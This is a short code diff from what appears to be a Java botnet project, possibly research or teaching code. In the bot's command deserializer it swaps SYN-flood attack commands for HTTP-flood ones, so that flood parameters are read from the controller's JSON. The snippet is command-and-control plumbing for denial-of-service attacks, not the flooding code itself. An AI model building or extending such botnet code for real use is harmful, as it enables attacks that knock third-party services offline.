@@ -26,7 +26,7 @@
 
 package com.acmutv.botnet.core.control.command.serial;
 
-import com.acmutv.botnet.core.attack.SynFloodAttack;
+import com.acmutv.botnet.core.attack.flooding.HttpFloodAttack;
 import com.acmutv.botnet.core.control.command.BotCommand;
 import com.acmutv.botnet.core.control.command.CommandScope;
 import com.acmutv.botnet.tool.time.Interval;
@@ -93,19 +93,19 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
 
       switch (cmd.getScope()) {
 
-        case ATTACK_SYNFLOOD:
+        case ATTACK_HTTPFLOOD:
           if (node.hasNonNull("attacks")) {
-            List<SynFloodAttack> attacks = new ArrayList<>();
+            List<HttpFloodAttack> attacks = new ArrayList<>();
             Iterator<JsonNode> i = node.get("attacks").elements();
             while (i.hasNext()) {
               JsonNode n = i.next();
-              SynFloodAttack attack = ctx.readValue(n.traverse(parser.getCodec()), SynFloodAttack.class);
+              HttpFloodAttack attack = ctx.readValue(n.traverse(parser.getCodec()), HttpFloodAttack.class);
               attacks.add(attack);
             }
 
             cmd.getParams().put("attacks", attacks);
           } else {
-            throw new IOException("Cannot read parameters [attacks] for scope [ATTACK_SYNFLOOD] (missing)");
+            throw new IOException("Cannot read parameters [attacks] for scope [ATTACK_HTTPFLOOD] (missing)");
           }
 
           if (node.hasNonNull("delay")) {
